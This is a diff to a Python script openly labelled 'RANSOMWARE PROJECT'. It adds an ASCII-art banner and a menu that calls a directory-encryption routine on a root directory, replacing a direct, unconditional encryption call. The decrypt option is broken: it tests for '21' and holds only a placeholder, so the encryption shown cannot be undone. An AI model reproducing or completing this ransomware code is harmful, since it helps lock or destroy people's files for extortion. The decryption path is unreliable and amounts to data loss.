@@ -233,17 +233,29 @@ def createFile(fileName, jsonObj):
     f.write(jsonObj)
     f.close()
 
+name = """  _______                         ___   
+ |__   __|                       |_  |
+    | | ___   _____  _______   __  | |
+    | |/ _ \ / _   ||       | |__| | |
+    | |  __/| |_|| || ||_|| |      | |
+    |_|\___/ \___|_||_|   |_|      |_|"""
+print("=========================================")
+print(name)
+print("=========================================")
+print("           RANSOMWARE  PROJECT           ")
+print("=========================================")
+print("Root directory: ", rootDirectory)
+print("1. Encrypt the directory")
+print("2. Decrypt the directory")
+print("=========================================")
+selection = input("Enter your selection: ")
+
+if(selection == '1'):
+    encDirectory(rootDirectory)
+elif(selection == '21'):
+    #DECRYPT CALL
+    print("")
+else:
+    print("Invalid Selection")
 
 
-name = """   _______        _         
- |__   __|      | |        
-    | | _____  _| |_       
-    | |/ _ \ \/ / __|      
-    | |  __/>  <| |_ _ _ _ 
-    |_|\___/_/\_\\__(_|_|_)
-                           
-                           
-"""
-
-
-encDirectory(rootDirectory)
